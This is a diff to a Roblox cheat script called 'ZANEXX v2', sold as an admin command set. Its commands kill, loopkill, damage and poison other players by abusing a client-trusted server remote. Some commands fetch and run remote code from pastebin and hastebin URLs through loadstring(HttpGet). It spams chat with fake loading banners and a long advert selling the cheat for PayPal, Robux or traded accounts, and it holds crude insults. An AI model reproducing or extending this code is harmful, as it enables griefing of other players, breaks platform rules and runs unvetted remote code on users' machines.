@@ -1,4 +1,68 @@
+local plr = game.Players.LocalPlayer.Name
+local rnd1 = math.random(21,60)
+local rnd2 = math.random(61,97)
+local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "                             >LOADING  ZANEXX V2<    ["..rnd1.."%]                     ",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+    
+    
+wait(.5)
 
+
+local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "                             >LOADING<  ZANEXX V2    ["..rnd2.."%]                    ",
+        [2] = "All"}
+     remote:FireServer(unpack(args))
+     
+     
+wait(.5)
+
+
+	local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "                               >ZANEXX V2 Loaded<                                ",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+    
+    
+wait(1)	
+
+
+if plr == "LILEDDY03" then
+	local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "Welcome, [Buyer] "..plr..", ZANEXX Made By >exclusiveclique<",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+    
+    
+elseif plr == "exclusiveclique" then
+	local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "Welcome, "..plr.." [Owner]",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+
+    
+    
+    elseif plr == "Jay_Trvp" then
+	local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "Welcome, "..plr.." [croodieeeeeeeeeee]",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+    
+    
+    elseif plr == ""..plr.."" then
+	local remote = Game["ReplicatedStorage"]["DefaultChatSystemChatEvents"]["SayMessageRequest"]
+    local args = {
+        [1] = "Welcome, "..plr.." [Buyer]",
+        [2] = "All"}
+    remote:FireServer(unpack(args))
+    end
 
   local lol = game.Players.LocalPlayer.Name
   if lol == "Luhnly" then
@@ -6,7 +70,7 @@
   end
   
   ------------------------------------------------------------------------------------------------------------
-  
+  local mr = math.random(100, 255)
    local x = tick(start)
   local sinplr = game:GetService("Players")
   local sinlp = sinplr.LocalPlayer	
@@ -15,6 +79,8 @@
   local Owners = {["exclusiveclique"] = "Owner", ["qtiepies"] = "Owner",}
   local color1 = Color3.fromRGB(255, 255, 255)
   local color2 = Color3.fromRGB(255, 94, 226) 
+  local color3 = Color3.fromRGB(205, 50, 50)
+  local color4 = Color3.fromRGB(0, 0, 0) 
   local changeSpeed = 10 
   local plr = game:GetService'Players'.LocalPlayer
   local mouse = plr:GetMouse()
@@ -305,23 +371,21 @@
       for i, x in pairs(n.Chats:GetChildren()) do
         if x.Name == "Chat" then 
         
-        if string.find(x.Text, "exclusiveclique") then
+
+        if string.find(x.Text, "exclusiveclique") then 
         x.Text = string.gsub(x.Text, "exclusiveclique", "[Owner] Zack") 
-        x.TextStrokeTransparency = .1
+        x.TextTransparency = 0
+        x.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
         x.TextColor3 = Color3.fromRGB(0, 0, 0)
         while true do
          for a = 1,360,1 do wait(.01)
           x.TextStrokeColor3 = Color3.fromHSV(a/360,1,1)
          end
         end
-    
         
-        elseif string.find(x.Text, "Jay_Trvp") then 
-        x.Text = string.gsub(x.Text, "Jay_Trvp", "[croo] Jay") 
-        x.TextColor3 = Color3.fromRGB(0, 220, 0)
 
-        elseif string.find(x.Text, "versacari") then
-        x.Text = string.gsub(x.Text, "versacari", "[LOOPKILL] versacarl" )
+        elseif string.find(x.Text, "IustangeI") then
+        x.Text = string.gsub(x.Text, "IustangeI", "[LOOPKILL] Iustangel" )
         x.TextColor3 = Color3.fromRGB(255, 0, 0)
 
         elseif string.find(x.Text, "holylust") then
@@ -350,27 +414,26 @@
                       255 * (color1.r + (color2.r - color1.r) * f),
                       255 * (color1.g + (color2.g - color1.g) * f), 
                       255 * (color1.b + (color2.b - color1.b) * f))
-                  wait(0.05)                          
-              end
-          end
-      end) 
-    end
-    end
-    end
-    end
-    end)
-    end
-    
+                  wait(0.05)
+end
+end
+end)
+end
+end
+end
+end
+end)
+end
   ------------------------------------------------------------------------------------------------------------
-  
-  game.Players.LocalPlayer.Character:BreakJoints()
+
   
   ------------------------------------------------------------------------------------------------------------
   
   SendM("[ZANEXX v2 LCM]: ZANEXX v2 Loaded", Color3.fromRGB(0, 55, 200))
   SendM("[ZANEXX v2 LCM]: Welcome, "..Pname..", Prefix Is Set To: None", Color3.fromRGB(0, 55, 220))
   
-  ------------------------------------------------------------------------------------------------------------
+  ------------------------------------------------------------------------------------------------------------\
+
   
   function Fly()
   mouse = game.Players.LocalPlayer:GetMouse''
@@ -462,6 +525,98 @@
               end
         end)
       end
+
+
+      function FFly()
+          mouse = game.Players.LocalPlayer:GetMouse''
+          localplayer = game.Players.LocalPlayer
+          game.Players.LocalPlayer.Character:WaitForChild("Torso")
+                  local torso = game.Players.LocalPlayer.Character.Torso 
+                  local flying = true
+                  local speed = 0
+                  local keys={a=false,d=false,w=false,s=false} 
+                  local e1
+                  local e2
+                  local function start()
+                      local pos = Instance.new("BodyPosition",torso)
+                      local gyro = Instance.new("BodyGyro",torso)
+                      pos.Name = "EPIXPOS"
+                      pos.maxForce = Vector3.new(2^1024, 2^1024, 2^1024)
+                      pos.position = torso.Position
+                      gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+                      gyro.cframe = torso.CFrame
+                      repeat
+                          wait()
+                          localplayer.Character.Humanoid.PlatformStand=true
+                          local new=gyro.cframe - gyro.cframe.p + pos.position
+                          if not keys.w and not keys.s and not keys.a and not keys.d then
+                              speed=50
+                          end
+                          if keys.w then 
+                              new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                              speed=speed+50
+                          end
+                          if keys.s then 
+                              new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                              speed=speed+50
+                          end
+                          if keys.d then 
+                              new = new * CFrame.new(speed,0,0)
+                              speed=speed+50
+                          end
+                          if keys.a then 
+                              new = new * CFrame.new(-speed,0,0)
+                              speed=speed+50
+                          end
+                          if speed>5 then
+                              speed=50
+                          end
+                          pos.position=new.p
+                          if keys.w then
+                              gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*15),0,0)
+                          elseif keys.s then
+                              gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*15),0,0)
+                          else
+                              gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+                          end
+                      until flying==false
+                      if gyro then gyro:Destroy() end
+                      if pos then pos:Destroy() end
+                      flying=false
+                      localplayer.Character.Humanoid.PlatformStand=false
+                      speed=0
+                  end
+                  e1=mouse.KeyDown:connect(function(key)
+                      if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+                      if key=="w" then
+                          keys.w=true
+                      elseif key=="s" then
+                          keys.s=true
+                      elseif key=="a" then
+                          keys.a=true
+                      elseif key=="d" then
+                          keys.d=true
+                      elseif key=="f" then
+                          if flying==true then
+                              flying=false
+                          else
+                              flying=true
+                              start()
+                          end
+                      end
+                  end)
+                  e2=mouse.KeyUp:connect(function(key)
+                      if key=="w" then
+                          keys.w=false
+                      elseif key=="s" then
+                          keys.s=false
+                      elseif key=="a" then
+                          keys.a=false
+                      elseif key=="d" then
+                          keys.d=false
+                      end
+                end)
+              end
   -------------------------------------------------------------------------------------------------------------------
   
 
@@ -819,13 +974,13 @@
   Zanexx("fov", "Changes Your FOV", function(args)
   local fval = args[1]
   game.workspace.Camera.FieldOfView = fval
-  SendM("[ZANEXX LCM]: LP FOV Changed To ["..fval.."]", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: LP FOV Changed To ["..fval.."]", Color3.fromRGB(150, 122, 150))
   end)
   
   
   
   Zanexx("rj", "Rejoins The Current Server You Are In", function(args)
-  SendM("[ZANEXX LCM]: Rejoining Please Wait", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Rejoining Please Wait", Color3.fromRGB(150, 122, 150))
   game:GetService("TeleportService"):Teleport(game.PlaceId)
   end)
   
@@ -834,7 +989,7 @@
   Zanexx("ws", "Changes The LocalPlayers WalkSpeed", function(args)
   local wval = args[1]
   game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = wval
-  SendM("[ZANEXX LCM]: WalkSpeed Changed To ["..wval.."]", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: WalkSpeed Changed To ["..wval.."]", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -842,21 +997,26 @@
   Zanexx("jp", "Changes The LocalPlayers Jump Height", function(args)
   local jval = args[1]
   game.Players.LocalPlayer.Character.Humanoid.JumpPower = jval
-  SendM("[ZANEXX LCM]: JumpPower Changed To ["..jval.."]", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: JumpPower Changed To ["..jval.."]", Color3.fromRGB(150, 122, 150))
   end)
   
   
   
   Zanexx("Fly", "Makes The LocalPlayer Fly", function(args)
-  SendM("[ZANEXX LCM]: Press F Twice To Start Flying", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Press F Twice To Start Flying", Color3.fromRGB(150, 122, 150))
   Fly()
+  end)
+
+  Zanexx("ffly", "Makes The LocalPlayer Fly Faster", function(args)
+    SendM("[ZANEXX LCM]: Press F Twice To Start Flying", Color3.fromRGB(150, 122, 150))
+    FFly()
   end)
   
   
   
   Zanexx("rst", "Makes The LocalPlayer Reset", function(args)
   game.Players.LocalPlayer.Character:BreakJoints()
-  SendM("[ZANEXX LCM]: Clapped XD", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Clapped XD", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -864,7 +1024,7 @@
   Zanexx("view", "Spectates The Chosen Player", function(args)
   local players = FindPlr(args[1])
   workspace.CurrentCamera.CameraSubject = game.Players[players[1]].Character
-  SendM("[ZANEXX LCM]: Fucking Pedo Smh..", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Fucking Pedo Smh..", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -878,16 +1038,16 @@
   Zanexx("slock", "Enables Shiftlock For The LocalPlayer", function(args)
   local plr = game.Players.LocalPlayer
   plr.DevEnableMouseLock = true
-  SendM("[ZANEXX LCM]: Shiftlock Enabled", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Shiftlock Enabled", Color3.fromRGB(150, 122, 150))
   end)
   
   
   
   Zanexx("prefix", "Lets The LocalPlayer Change The Prefix To Anything", function(args)
-  SendM("[ZANEXX LCM]: Prefix Before: "..prfx.."", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Prefix Before: "..prfx.."", Color3.fromRGB(150, 122, 150))
   local pargs = args[1]
   prfx = pargs
-  SendM("[ZANEXX LCM]: Prefix Changed To: "..prfx.."", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Prefix Changed To: "..prfx.."", Color3.fromRGB(150, 122, 150))
   
   if prfx == "!" then
   popup("Prefix Set To [!] (Matts Admin)")
@@ -913,7 +1073,7 @@
   if players ~= nil and _char(players[1]):FindFirstChild("HumanoidRootPart") then
   _char(admin).HumanoidRootPart.CFrame = _char(players[1]).HumanoidRootPart.CFrame
   end
-  SendM("[ZANEXX LCM]: Teleported To ".._char(players[1]).Name.."", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Teleported To ".._char(players[1]).Name.."", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -949,7 +1109,7 @@
           end)
           for i, v in pairs(players) do
           local plrn = FP[v].Name
-          SendM("[ZANEXX LCM]: "..plrn.." Whitelisted", Color3.fromRGB(0, 55, 240))
+          SendM("[ZANEXX LCM]: "..plrn.." Whitelisted", Color3.fromRGB(150, 122, 150))
           end
   end)
   
@@ -965,7 +1125,7 @@
           end)
                     for i, v in pairs(players) do
           local plrn = FP[v].Name
-          SendM("[ZANEXX LCM]: "..plrn.." UnWhitelisted", Color3.fromRGB(0, 55, 240))
+          SendM("[ZANEXX LCM]: "..plrn.." UnWhitelisted", Color3.fromRGB(150, 122, 150))
           end
   end)
   
@@ -1033,14 +1193,14 @@
   local num = args[2]
   for i, v in pairs(players) do
   local plrn = FP[v].Name
-  SendM("[ZANEXX LCM]: Now Playing ["..num.."] On "..plrn.."", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Now Playing ["..num.."] On "..plrn.."", Color3.fromRGB(150, 122, 150))
   game.ReplicatedStorage.Event:FireServer("PlayRadio", FP[v], num)
   end
   end)
   
   
   Zanexx("Kgui", "Opens the ZANEXX knife gui", function(args)
-  SendM("[ZANEXX LCM]: Knife Gui Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Knife Gui Loaded", Color3.fromRGB(150, 122, 150))
   loadstring(game:HttpGet("https://pastebin.com/raw/SN5BmNtD"))()
   end)
   
@@ -1051,7 +1211,7 @@
   game.Workspace.Gun.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
   wait(1)
   game.Workspace.Gun.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-  SendM("[ZANEXX LCM]: Gun Teleported", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Gun Teleported", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -1059,7 +1219,7 @@
     local players = FindPlr(args[1])
     for i, p in pairs(players) do
       local plrn = FP[p].Name
-      SendM("[ZANEXX LCM]: "..plrn.." Cloaked", Color3.fromRGB(0, 55, 240))
+      SendM("[ZANEXX LCM]: "..plrn.." Cloaked", Color3.fromRGB(150, 122, 150))
       local x = game.Workspace.Ignore.Players:FindFirstChild(players[1])
       game.ReplicatedStorage.Event:FireServer("Cloak", x)
     end
@@ -1071,7 +1231,7 @@
   local players = FindPlr(args[1])
   for i, p in pairs(players) do
     local plrn = FP[p].Name
-  SendM("[ZANEXX LCM]: "..plrn.." UnCloaked", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." UnCloaked", Color3.fromRGB(150, 122, 150))
   local x = game.Workspace.Ignore.Players:FindFirstChild(players[1])
   game.ReplicatedStorage.Event:FireServer("UnCloak", x)
   end
@@ -1101,7 +1261,7 @@
   local players = FindPlr(args[1])
   for i, v in pairs(players) do
   local plrn = FP[v].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Killed", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Killed", Color3.fromRGB(150, 122, 150))
   game.ReplicatedStorage.Event:FireServer("TPD", math.huge, FP[v].Character.Humanoid)
   end
   end)  
@@ -1113,7 +1273,7 @@
   local dmgp = args[2]
   for i, p in pairs(players) do
   local plrn = FP[p].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Damaged By ["..dmgp.."HP]", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Damaged By ["..dmgp.."HP]", Color3.fromRGB(150, 122, 150))
   game.ReplicatedStorage.Event:FireServer("TPD", dmgp, FP[p].Character.Humanoid)
   end
   end)
@@ -1125,7 +1285,7 @@
   local healn = args[2]
   for i, p in pairs(players) do
     local plrn = FP[p].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Healed By ["..dmgp.."HP]", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Healed By ["..dmgp.."HP]", Color3.fromRGB(150, 122, 150))
   game.ReplicatedStorage.Event:FireServer("TPD", -healn, FP[p].Character.Humanoid)
   end
 
@@ -1136,7 +1296,7 @@
     local players = FindPlr(args[1])
     for i, v in pairs(players) do
     local plrn = FP[v].Name
-    SendM("[ZANEXX LCM]: "..plrn.." Loopkilled", Color3.fromRGB(0, 55, 240))
+    SendM("[ZANEXX LCM]: "..plrn.." Loopkilled", Color3.fromRGB(150, 122, 150))
       if FP[v]:FindFirstChild("ml") then
       FP[v]:FindFirstChild("ml"):Destroy()
       end
@@ -1160,7 +1320,7 @@
       local players = FindPlr(args[1])
       for i, v in pairs(players) do
       local plrn = FP[v].Name
-      SendM("[ZANEXX LCM]: "..plrn.." Loopgodded", Color3.fromRGB(0, 55, 240))
+      SendM("[ZANEXX LCM]: "..plrn.." Loopgodded", Color3.fromRGB(150, 122, 150))
         if FP[v]:FindFirstChild("lg") then
         FP[v]:FindFirstChild("lg"):Destroy()
         end
@@ -1171,7 +1331,8 @@
         game:GetService("RunService").Heartbeat:Connect(function()
         if FP[v]:FindFirstChild("lg") then
       wait()
-          game.ReplicatedStorage.Event:FireServer("TPD", (-0.53220192342997) ^ 1.45, game.Players:FindFirstChild(FP[v].Name).Character.Humanoid)
+          game.ReplicatedStorage.Event:FireServer("TPD", -math.huge, game.Players:FindFirstChild(FP[v].Name).Character.Humanoid)
+          game.ReplicatedStorage.Event:FireServer("TPD", math.huge ^ 1.45, game.Players:FindFirstChild(FP[v].Name).Character.Humanoid)
         end
       end)
       end
@@ -1183,7 +1344,7 @@
   local players = FindPlr(args[1])
   for i, v in pairs(players) do
         local plrn = FP[v].Name
-    SendM("[ZANEXX LCM]: "..plrn.." UnLoopkilled", Color3.fromRGB(0, 55, 240))
+    SendM("[ZANEXX LCM]: "..plrn.." UnLoopkilled", Color3.fromRGB(150, 122, 150))
     if FP[v]:FindFirstChild("ml") then
       FP[v]:FindFirstChild("ml"):Destroy()
     end
@@ -1197,7 +1358,7 @@
   RA()
   for i, h in pairs(players) do
   local plrn = FP[h].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Godded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Godded", Color3.fromRGB(150, 122, 150))
   game.ReplicatedStorage.Event:FireServer("TPD", (-0.53220192342997) ^ 1.45, FP[h].Character.Humanoid)
   end
   end)
@@ -1208,7 +1369,7 @@
   RA()
   for i, v in pairs(players) do
   local plrn = FP[v].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Loopgodded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Loopgodded", Color3.fromRGB(150, 122, 150))
   if FP[v]:FindFirstChild("lgod") then
   FP[v]:FindFirstChild("lgod"):Destroy()
   end
@@ -1231,7 +1392,7 @@ end
   local players = FindPlr(args[1])
   for i, v in pairs(players) do
   local plrn = FP[v].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Unloopgodded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Unloopgodded", Color3.fromRGB(150, 122, 150))
   if FP[v]:FindFirstChild("lg") then
   FP[v]:FindFirstChild("lg"):Destroy()
   end
@@ -1244,7 +1405,7 @@ end
   local players = FindPlr(args[1])
   for i, p in pairs(players) do
   local plrn = FP[p].Name
-  SendM("[ZANEXX LCM]: "..plrn.." Poisoned", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: "..plrn.." Poisoned", Color3.fromRGB(150, 122, 150))
   while wait() do
     game.ReplicatedStorage.Event:FireServer("TPD", 1, FP[p].Character.Humanoid)
     if FP[p].Character.Humanoid.Health == 0 then
@@ -1308,7 +1469,7 @@ end
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
     end
     end
-  SendM("[ZANEXX LCM]: Done", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Done", Color3.fromRGB(150, 122, 150))
     end)
     
   
@@ -1317,7 +1478,7 @@ end
       local players = FindPlr(args[1])
       for i, v in pairs(players) do
       local plrn = FP[v].Name
-      SendM("[ZANEXX LCM]: "..plrn.." Radio-Banned", Color3.fromRGB(0, 55, 240))
+      SendM("[ZANEXX LCM]: "..plrn.." Radio-Banned", Color3.fromRGB(150, 122, 150))
       if FP[v]:FindFirstChild("rban") then
       FP[v]:FindFirstChild("rban"):Destroy()
       end
@@ -1331,7 +1492,6 @@ end
       end
       end)
       end
-      SendM("[ZANEXX LCM]: Player(-s) Radio-banned", Color3.fromRGB(0, 55, 240))
       end)
       
       
@@ -1340,12 +1500,193 @@ end
         local players = FindPlr(args[1])
         for i, v in pairs(players) do
         local plrn = FP[v].Name
-        SendM("[ZANEXX LCM]: "..plrn.." UnRadio-Banned", Color3.fromRGB(0, 55, 240))
+        SendM("[ZANEXX LCM]: "..plrn.." UnRadio-Banned", Color3.fromRGB(150, 122, 150))
         if FP[v]:FindFirstChild("rban") then
         FP[v]:FindFirstChild("rban"):Destroy()
         end
         end
         end)
+
+
+
+      Zanexx("cc", "Clears The Chat", function(args)
+      loadstring(game:HttpGet'https://hastebin.com/raw/uruzulihaf')()
+        end)
+
+
+
+      Zanexx("lh", "LoopHeals The Chosen Player", function(args)
+        local players = FindPlr(args[1])
+        for i, p in pairs(players) do
+          local plrn = FP[p].Name
+          SendM("[ZANEXX LCM]: Loophealing "..plrn.."", Color3.fromRGB(150, 122, 150))
+          while 2 > 1 do
+          wait()
+          game.ReplicatedStorage.Event:FireServer("TPD", -1, FP[p].Character.Humanoid)
+          if FP[p].Character.Humanoid.Health == 100 then
+            break
+          end
+        end
+      end
+      end)
+      
+      
+            Zanexx("fh", "LoopHeals The Chosen Player", function(args)
+        local players = FindPlr(args[1])
+        local mouse = game.Players.LocalPlayer:GetMouse()
+        mouse.KeyDown:Connect(function(t)
+        for i, p in pairs(players) do
+          local plrn = FP[p].Name
+          SendM("[ZANEXX LCM]: Loophealing "..plrn.."", Color3.fromRGB(150, 122, 150))
+          repeat
+          wait()
+          game.ReplicatedStorage.Event:FireServer("TPD", 1, FP[p].Character.Humanoid)
+          until 
+          FP[p].Character.Humanoid.Health == 20
+          if FP[p].Character.Humanoid.Health == 20 then
+          repeat
+          game.ReplicatedStorage.Event:FireServer("TPD", 1, FP[p].Character.Humanoid)
+          until 
+          FP[p].Character.Humanoid.Health == 20
+          end
+	      end
+          end)
+          end)
+
+
+      
+      
+      
+            Zanexx("advertise", "Advertises ZANEXX (ty)", function(args)
+            local msg = '                                 '
+      game.Players:Chat([[
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
